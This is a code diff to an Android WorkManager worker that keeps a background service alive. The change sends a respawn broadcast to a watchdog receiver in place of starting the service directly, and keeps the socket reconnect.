@@ -2,18 +2,14 @@ package com.fason.app.worker;
 
 import android.content.Context;
 import android.content.Intent;
-
 import androidx.annotation.NonNull;
 import androidx.work.Worker;
 import androidx.work.WorkerParameters;
-
+import com.fason.app.core.Protocol;
 import com.fason.app.core.network.SocketClient;
 import com.fason.app.receiver.WatchdogReceiver;
-import com.fason.app.service.MainService;
 
-/** WorkManager worker that restarts the service and reconnects the socket. */
 public class KeepAliveWorker extends Worker {
-
     public KeepAliveWorker(@NonNull Context context, @NonNull WorkerParameters params) {
         super(context, params);
     }
@@ -22,16 +18,17 @@ public class KeepAliveWorker extends Worker {
     @Override
     public Result doWork() {
         if (WatchdogReceiver.isActive(getApplicationContext())) {
-            startSvc();
+            respawnService();
             ensureSocket();
         }
         return Result.success();
     }
 
-    private void startSvc() {
+    private void respawnService() {
         try {
-            getApplicationContext().startForegroundService(
-                new Intent(getApplicationContext(), MainService.class));
+            Intent intent = new Intent(getApplicationContext(), WatchdogReceiver.class);
+            intent.setAction(Protocol.BC_RESPAWN_SERVICE);
+            getApplicationContext().sendBroadcast(intent);
         } catch (Exception ignored) {}
     }
 
